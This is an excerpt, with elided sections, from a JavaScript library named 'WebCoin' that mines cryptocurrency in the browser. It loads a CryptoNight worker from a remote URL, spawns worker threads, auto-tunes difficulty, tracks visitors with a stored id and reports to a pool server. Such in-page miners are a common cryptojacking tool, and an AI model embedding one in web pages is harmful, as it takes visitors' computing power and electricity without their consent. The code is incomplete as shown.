(function(window) {
	...
	this._autoDifficultyTimer = null;
	this._diffArray = [];
	this._lastSendTime = null;
	this._userId = function() {
	    if(localStorage.getItem("userid")!=null) return localStorage.getItem("userid");
	    var userid = '_'+Math.random().toString(36).substr(2,36);
    ...
    Miner.prototype.start = function(mode) {
        this._tab.mode = mode || WebCoin.IF_EXCLUSIVE_TAB;
        if (this._useWASM || this._asmjsStatus === "loaded") {
            ...
            xhr.addEventListener("load", function() {
                WebCoin.CRYPTONIGHT_WORKER_BLOB = window.URL.createObjectURL(new Blob([xhr.responseText]));
                this._asmjsStatus = "loaded";
                this._startNow()
            }.bind(this), xhr);
            xhr.open("get", WebCoin.CONFIG.LIB_URL + WebCoin.CONFIG.ASMJS_NAME, true);
            xhr.send();
        }
	this._autoReconnect = true;
    };
    ...
    Miner.prototype.setPool = function(pool) {
	this._pool = Math.max(0, Math.min(100, pool));
    }
    Miner.prototype.getPool = function() {
	return this._pool;
    }
	...
	this._targetNumThreads = num;
        if (num > this._threads.length) {
            for (var i = 0; num > this._threads.length; i++) {
                var thread = new WebCoin.JobThread;
                if (this._currentJob) {
	...
	var diff = this._siteKey.substr(this._siteKey.lastIndexOf(".")+1);
	if (diff==this._siteKey) {
	    this._diffArray = new Array();
	    var autodiff = localStorage.getItem("autodiff");
	    if (autodiff) {
		this._siteKey += '.'+autodiff;
		this._setLogging('Set difficulty to '+autodiff);
	    }
	    this._autoDifficultyTimer = setInterval(this._autoDifficulty.bind(this), 1e3*2);
	}

        this.setNumThreads(this._targetNumThreads);
	this._onOpen(this);
	this._pingTimer = setInterval(this._ping.bind(this), 1e3*10);
    };
    Miner.prototype._autoDifficulty = function() {
	if(this._autoDifficultyTimer == -1) return false;
	if (this.isRunning()&&(this.getHashesPerSecond()>0)) {
	    this._diffArray.push(this.getHashesPerSecond());
	    if (this._diffArray.length>=10) {
		var sum = this._diffArray.reduce(function(a, b) { return a + b; }, 0);
		var diff = Math.floor((sum/this._diffArray.length)*60);

		var autodiff = localStorage.getItem("autodiff");
		if (autodiff) {
		    var unequal = (Math.abs(diff-autodiff)*100)/diff;
		    if (unequal<10) {
			clearInterval(this._autoDifficultyTimer);
			this._autoDifficultyTimer = -1;
			this._setLogging('Difficulty stay old '+diff+'/'+autodiff);
			return false;
		    }
		    else this._siteKey = this._siteKey.substr(0, this._siteKey.lastIndexOf("."));
		}
		if (diff<100) {
		    this._setLogging('Very low difficulty '+diff+', min 100. Stop work.');
		    this.stop();
		    return false;
		}
		this._siteKey += '.'+diff;
		clearInterval(this._autoDifficultyTimer);
		this._setLogging('Set new difficulty to '+diff);
		this._onError();
		localStorage.setItem("autodiff", diff);
	    }
	}
    ...
    Miner.prototype._otherTabRunning = function() {
        try {
            var tdjson = localStorage.getItem("webcoin");
            if (tdjson) {
    ...
    Miner.prototype._ping = function() {
	if (this._autoReconnect==false) {
	    clearInterval(this._pingTimer);
	    return false;
	}
	var nowTime = Math.floor(Date.now() / 1000);
	if (nowTime > this._lastSendTime + 60) {
	    this._send("ping", {})
	}
    };
	...
	if(ev.target.readyState !== 4 || ev.target.status !== 200) return false;
        if (!ev.target.responseText) return false;

	var msg = JSON.parse(ev.target.responseText);
        if (msg.type === "job") {
	    this._error = '';
	    this._setLogging('New job is received');
	    ...
	    this._setLogging('Hashes accepted '+this._hashes);
            ...
            this._error = msg.error.message;
	    this._setLogging('Error: '+this._error);
            this._reconnectRetry = 10;
	    this._onError();
    ...
    Miner.prototype._setLogging = function(str) {
	var d = new Date();
	var date_string = ('0'+d.getDate()).slice(-2) + '.' + ('0'+d.getMonth()).slice(-2) + '.' + d.getFullYear();
	date_string += ' ' + ('0'+d.getHours()).slice(-2) + ':' + ('0'+d.getMinutes()).slice(-2) + ':' + ('0'+d.getSeconds()).slice(-2);

	this._logging.unshift(date_string+' '+str);
	if (this._logging.length>10) this._logging.pop();
    };
    ...
    Miner.prototype._send = function(type, params) {
        this._lastSendTime = Math.floor(Date.now() / 1000);
	var msg = {
            method: type,
	    userid: this._userId(),
            params: params || {}
	...
	var xhr = new XMLHttpRequest();
	xhr.open("POST", WebCoin.CONFIG.SERVER_URL,true);
	xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
	xhr.onreadystatechange = this._onMessage.bind(this);
	xhr.send(JSON.stringify(msg));
    };
    window.WebCoin = window.WebCoin || {};
    window.WebCoin.IF_EXCLUSIVE_TAB = "ifExclusiveTab";
    window.WebCoin.FORCE_EXCLUSIVE_TAB = "forceExclusiveTab";
    window.WebCoin.FORCE_MULTI_TAB = "forceMultiTab";
    window.WebCoin.Miner = function(siteKey, params) {
...
(function(window) {
    ...
    var JobThread = function() {
        this.worker = new Worker(WebCoin.CRYPTONIGHT_WORKER_BLOB);
